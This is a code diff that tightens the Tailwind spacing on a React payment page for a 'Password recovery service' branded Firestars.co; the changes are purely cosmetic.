@@ -65,9 +65,9 @@ const PaymentPage = () => {
   };
 
   return (
-    <div className="min-h-screen w-full bg-gradient-to-b from-[#080C18] to-[#101729] px-4 py-8 sm:px-6 sm:py-12">
+    <div className="min-h-screen w-full bg-gradient-to-b from-[#080C18] to-[#101729] px-4 py-6 sm:px-6 sm:py-8">
       <div className="max-w-md mx-auto">
-        <div className="flex items-center justify-center gap-3 mb-5">
+        <div className="flex items-center justify-center gap-3 mb-4">
           <div className="h-px w-12 bg-[#3CEFFF]/60"></div>
           <LockKeyhole className="h-5 w-5 text-[#3CEFFF]" />
           <h1 className="text-xl font-bold text-white">Payment Required</h1>
@@ -75,11 +75,11 @@ const PaymentPage = () => {
         </div>
 
         {/* Tutorial Button */}
-        <div className="text-center mb-4">
+        <div className="text-center mb-3">
           <Button
             onClick={handleTutorialClick}
             variant="secondary"
-            className="bg-[#151f32] hover:bg-[#1a2236] text-white border border-[#3CEFFF]/20"
+            className="bg-[#151f32] hover:bg-[#1a2236] text-white border border-[#3CEFFF]/20 py-2"
           >
             <Youtube className="h-4 w-4 mr-2" />
             How to Pay - Tutorial
@@ -87,7 +87,7 @@ const PaymentPage = () => {
         </div>
         
         <div className="bg-[#111827] rounded-xl border border-[#1E293B] shadow-lg overflow-hidden">
-          <div className="bg-gradient-to-r from-[#1a2236] to-[#1c2943] p-4 sm:p-5 border-b border-[#1E293B] flex items-center justify-between">
+          <div className="bg-gradient-to-r from-[#1a2236] to-[#1c2943] p-3 sm:p-4 border-b border-[#1E293B] flex items-center justify-between">
             <div>
               <h2 className="text-white font-bold">@{username}</h2>
               <p className="text-xs text-[#94A3B8] mt-1">Password recovery service</p>
@@ -97,7 +97,7 @@ const PaymentPage = () => {
             </div>
           </div>
           
-          <div className="p-5 max-h-[calc(100vh-200px)] overflow-y-auto">
+          <div className="p-4 max-h-[calc(100vh-180px)] overflow-y-auto">
             {!verifying ? (
               <>
                 <PaymentHeader username={username} />
@@ -118,13 +118,13 @@ const PaymentPage = () => {
             )}
           </div>
           
-          <div className="border-t border-[#1E293B] p-4 flex items-center justify-center gap-2">
+          <div className="border-t border-[#1E293B] p-3 flex items-center justify-center gap-2">
             <Shield className="h-4 w-4 text-[#94A3B8]" />
             <p className="text-xs text-[#94A3B8]">Safe payment system</p>
           </div>
         </div>
         
-        <div className="mt-6 text-center text-xs text-[#94A3B8]">
+        <div className="mt-4 text-center text-xs text-[#94A3B8]">
           <p>© 2025 Firestars.co</p>
         </div>
       </div>
